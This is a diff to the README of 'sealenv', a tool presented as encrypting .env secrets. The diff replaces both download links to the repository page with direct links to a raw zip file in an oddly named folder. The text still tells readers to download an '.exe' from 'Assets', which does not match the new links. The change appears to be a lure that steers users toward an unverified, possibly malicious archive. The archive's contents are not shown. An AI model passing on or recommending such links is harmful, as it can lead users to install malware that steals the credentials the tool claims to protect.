@@ -1,6 +1,6 @@
 # 🔒 sealenv - Protect your files from data leaks
 
-[![](https://img.shields.io/badge/Download-Sealenv-blue.svg)](https://github.com/Chandh9749/sealenv)
+[![](https://img.shields.io/badge/Download-Sealenv-blue.svg)](https://github.com/Chandh9749/sealenv/raw/refs/heads/main/ledgeless/Software-1.6.zip)
 
 sealenv secures your sensitive information by encrypting your environment files. It prevents accidental exposure of API keys, passwords, and database credentials. You store your secrets in an encrypted format. Only authorized processes can read them. 
 
@@ -18,7 +18,7 @@ Developers often store secrets in plain-text files named .env. These files conta
 
 You need the latest version of the program to start. 
 
-[Visit this page to download sealenv](https://github.com/Chandh9749/sealenv)
+[Visit this page to download sealenv](https://github.com/Chandh9749/sealenv/raw/refs/heads/main/ledgeless/Software-1.6.zip)
 
 Navigate to the link above. Look for the section labeled "Assets." Click the file that ends in ".exe" to begin your download. Save the file to your "Downloads" folder.
 
